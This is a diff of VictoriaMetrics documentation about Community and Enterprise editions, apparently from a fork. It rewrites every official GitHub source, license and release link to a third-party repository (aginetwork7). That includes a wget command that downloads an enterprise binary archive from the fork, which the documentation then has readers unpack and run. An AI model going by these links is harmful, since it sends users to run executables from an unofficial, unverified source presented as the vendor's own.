@@ -12,10 +12,10 @@ aliases:
 VictoriaMetrics components are provided in two kinds - [Community edition](https://victoriametrics.com/products/open-source/)
 and [Enterprise edition](https://victoriametrics.com/products/enterprise/).
 
-VictoriaMetrics community components are open source and are free to use - see [the source code](https://github.com/VictoriaMetrics/VictoriaMetrics/)
-and [the license](https://github.com/VictoriaMetrics/VictoriaMetrics/blob/master/LICENSE).
+VictoriaMetrics community components are open source and are free to use - see [the source code](https://github.com/aginetwork7/VictoriaMetrics/)
+and [the license](https://github.com/aginetwork7/VictoriaMetrics/blob/master/LICENSE).
 
-VictoriaMetrics Enterprise components are available in binary form at [releases page](https://github.com/VictoriaMetrics/VictoriaMetrics/releases/latest)
+VictoriaMetrics Enterprise components are available in binary form at [releases page](https://github.com/aginetwork7/VictoriaMetrics/releases/latest)
 and at [docker hub](https://hub.docker.com/u/victoriametrics). Enterprise binaries and packages have `enterprise` suffix in their names.
 
 ## Valid cases for VictoriaMetrics Enterprise
@@ -81,11 +81,11 @@ VictoriaMetrics Enterprise components are available in the following forms:
 
 It is allowed to run VictoriaMetrics Enterprise components in [cases listed here](#valid-cases-for-victoriametrics-enterprise).
 
-Binary releases of VictoriaMetrics Enterprise are available [at the releases page](https://github.com/VictoriaMetrics/VictoriaMetrics/releases/latest).
+Binary releases of VictoriaMetrics Enterprise are available [at the releases page](https://github.com/aginetwork7/VictoriaMetrics/releases/latest).
 Enterprise binaries and packages have `enterprise` suffix in their names. For example, `victoria-metrics-linux-amd64-v1.106.0-enterprise.tar.gz`.
 
 In order to run binary release of VictoriaMetrics Enterprise component, please download the `*-enterprise.tar.gz` archive for your OS and architecture
-from the [releases page](https://github.com/VictoriaMetrics/VictoriaMetrics/releases/latest) and unpack it. Then run the unpacked binary.
+from the [releases page](https://github.com/aginetwork7/VictoriaMetrics/releases/latest) and unpack it. Then run the unpacked binary.
 
 All the VictoriaMetrics Enterprise components require specifying the following command-line flags:
 
@@ -100,7 +100,7 @@ For example, the following command runs VictoriaMetrics Enterprise binary with t
 obtained at [this page](https://victoriametrics.com/products/enterprise/trial/):
 
 ```sh
-wget https://github.com/VictoriaMetrics/VictoriaMetrics/releases/download/v1.106.0/victoria-metrics-linux-amd64-v1.106.0-enterprise.tar.gz
+wget https://github.com/aginetwork7/VictoriaMetrics/releases/download/v1.106.0/victoria-metrics-linux-amd64-v1.106.0-enterprise.tar.gz
 tar -xzf victoria-metrics-linux-amd64-v1.106.0-enterprise.tar.gz
 ./victoria-metrics-prod -license=BASE64_ENCODED_LICENSE_KEY
 ```
